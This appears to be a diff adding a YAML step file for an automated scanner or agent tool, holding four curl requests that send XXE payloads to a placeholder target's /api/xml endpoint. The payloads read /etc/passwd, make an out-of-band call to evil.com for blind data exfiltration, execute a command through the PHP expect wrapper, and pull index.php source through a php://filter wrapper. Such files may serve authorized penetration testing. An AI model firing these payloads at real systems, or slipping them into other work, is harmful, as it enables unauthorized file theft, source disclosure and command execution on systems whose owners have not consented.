@@ -1,0 +1,21 @@
+steps:
+  - tool: curl
+    arguments:
+      url: "http://{target}/api/xml"
+      additional_args: '-s -L -X POST -H "Content-Type: application/xml" -d "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>" --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'XXE: External entity inclusion for local file read via XML'
+  - tool: curl
+    arguments:
+      url: "http://{target}/api/xml"
+      additional_args: '-s -L -X POST -H "Content-Type: application/xml" -d "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://evil.com/xxe\">]><test>&xxe;</test>" --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'XXE: Out-of-band XXE test for blind data exfiltration'
+  - tool: curl
+    arguments:
+      url: "http://{target}/api/xml"
+      additional_args: '-s -L -X POST -H "Content-Type: application/xml" -d "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"expect://id\">]><test>&xxe;</test>" --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'XXE: PHP expect wrapper for command execution via XXE'
+  - tool: curl
+    arguments:
+      url: "http://{target}/api/xml"
+      additional_args: '-s -L -X POST -H "Content-Type: application/xml" -d "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]><test>&xxe;</test>" --max-time 10 -w "\nHTTP_CODE:%{http_code}\n"'
+    description: 'XXE: PHP filter wrapper for source code disclosure via XXE'
